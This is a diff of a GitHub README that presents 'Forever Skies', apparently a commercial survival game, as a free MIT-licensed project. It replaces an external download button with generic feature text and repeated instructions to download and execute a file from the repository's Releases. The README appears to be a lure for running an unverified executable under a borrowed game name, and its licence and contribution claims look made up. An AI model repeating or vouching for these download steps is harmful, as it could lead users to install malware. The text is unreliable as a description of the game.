@@ -1,39 +1,95 @@
-<div align="center">
- 
-![2](https://github.com/user-attachments/assets/6a7e45b1-8637-4fea-89e4-a8cf56f77d5e)
+# Forever Skies 🌌
 
-![3](https://github.com/user-attachments/assets/9366f93b-a883-4925-bdc1-104949d92d49)
+![Forever Skies](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)
 
-![0](https://github.com/user-attachments/assets/0e3566da-778c-4eb6-87ae-8c3fa6c58182)
+Welcome to **Forever Skies**, a thrilling first-person survival game set in a post-apocalyptic world. Here, you will navigate an ecologically ruined Earth, either solo or with friends. Gather resources, craft tools, and face the dangers that lie beneath as you seek a cure to save humanity.
 
-</div>
+## Table of Contents
 
-<div align="center"><a href="https://hikulyx.github.io/id/g78hng87vs"><img src="https://github.com/user-attachments/assets/61034c08-b057-4678-ab9b-94548508fb98" height="80"></a></div>
+- [Game Overview](#game-overview)
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Gameplay Mechanics](#gameplay-mechanics)
+- [Installation](#installation)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Links](#links)
 
-> 🔲 Supported CPU: AMD & Intel
->
-> 🔧 Supported architectures: 64-bit, 32-bit
->
-> 💿 Supported OS: Windows 11, Windows 10, Windows 8, Windows 7
+## Game Overview
 
-# About This Game
+In **Forever Skies**, you take on the role of a survivor in a world that has faced ecological collapse. Your mission is to build, upgrade, and pilot a high-tech airship. You can team up with up to three friends to scavenge for resources, craft essential tools, and combat the dangers lurking on the surface.
 
-* BUILD & CONTROL YOUR AIRSHIP
+### Storyline
 
-You will build and customize a high-tech airship. It will be your home, workshop, laboratory and more while flying above the surface of Earth. Control and steer it towards the ruins of our civilization and mysterious anomalies. Manage your airship hull and its integrity. Extract and gather resources to improve your airship and make it uniquely yours.
+As humanity struggles to survive, you must explore the remnants of civilization. The world is filled with secrets, and your journey will take you through abandoned cities, overgrown landscapes, and treacherous terrains. Each step brings you closer to uncovering the truth behind the ecological disaster and finding a way to save the human race.
 
-* UTILIZE SCIENCE TO SURVIVE
+## Features
 
-Your scientific know-how will allow you to build and operate different machines. Analyze scanned items and reverse engineer lost technology. Research new ways of obtaining food and resources, discover new tools, and increase the chance of your survival.
+- **Multiplayer Experience**: Play solo or team up with friends for cooperative gameplay.
+- **Resource Gathering**: Scavenge the environment for materials to craft tools and upgrade your airship.
+- **Dynamic World**: Explore a vast, open world filled with diverse biomes and hidden challenges.
+- **Crafting System**: Create a variety of tools and upgrades to enhance your survival chances.
+- **High-Tech Airship**: Build and customize your airship to navigate the skies and discover new locations.
 
-* SCAVENGE RUINED SKIES
+## Getting Started
 
-Explore and extract resources from the ruins that were built up high to escape the dust. Surrounded by drifting debris caused by a strange anomaly, harvest it into raw materials to help you survive. Explore and discover the remains of our civilization. Find out what happened and why Earth evolved to a place where we lost control of our previous position at the top. Discover secrets of our past.
+To dive into **Forever Skies**, follow these steps:
 
-* DESCEND BELOW THE DUST
+1. **Download the Game**: Head over to the [Releases section](https://github.com/rwillir/Forever-Skies/releases) to find the latest version. Download and execute the file.
+2. **Install**: Follow the installation instructions provided in the release notes.
+3. **Launch the Game**: Once installed, you can start the game and begin your adventure.
 
-After descending below the dust, you will discover a strange new world, the planet's surface that changed in our absence. Face evolved fauna and flora and hunt for viral pathogens to cure a mysterious illness threatening your family.
+## Gameplay Mechanics
 
-* RETURN TO EARTH
+### Survival Elements
 
-Forever Skies is an action-survival game taking place on Earth, which was devastated by a global ecological disaster. This event caused the surface of the planet to be covered in a colossal layer of toxic dust. You’re returning to our planet hundreds of years later - will you recognize our world?
+In **Forever Skies**, survival is key. You will need to manage resources, including food, water, and crafting materials. Pay attention to your environment and use your skills to adapt.
+
+### Crafting and Building
+
+Crafting is essential for survival. Gather resources from your surroundings to create tools, weapons, and upgrades for your airship. Building a sturdy airship will allow you to explore further and face greater challenges.
+
+### Exploration
+
+The world of **Forever Skies** is vast and filled with hidden treasures. Explore abandoned buildings, overgrown forests, and mysterious ruins. Each location offers unique challenges and resources.
+
+### Combat
+
+Face dangers on the surface as you hunt for resources. Combat mechanics will challenge your skills and strategy. Prepare yourself for encounters with wildlife and other threats.
+
+## Installation
+
+To install **Forever Skies**, follow these steps:
+
+1. Go to the [Releases section](https://github.com/rwillir/Forever-Skies/releases).
+2. Download the latest release.
+3. Execute the downloaded file and follow the prompts to install the game on your PC.
+
+## Contributing
+
+We welcome contributions from the community! If you want to help improve **Forever Skies**, follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your changes to your fork.
+5. Submit a pull request to the main repository.
+
+Please ensure that your code adheres to our coding standards and that you include tests where applicable.
+
+## License
+
+**Forever Skies** is licensed under the MIT License. Feel free to use, modify, and distribute the code as long as you include the original license.
+
+## Contact
+
+For questions or feedback, please reach out to us through the GitHub issues page or directly via email.
+
+## Links
+
+- [Download Forever Skies](https://github.com/rwillir/Forever-Skies/releases)
+- [Official Website](https://foreverskies.com)
+- [Community Discord](https://discord.gg/foreverskies)
+
+Join us on this adventure and help shape the future of **Forever Skies**! Your journey awaits. 🌍✈️
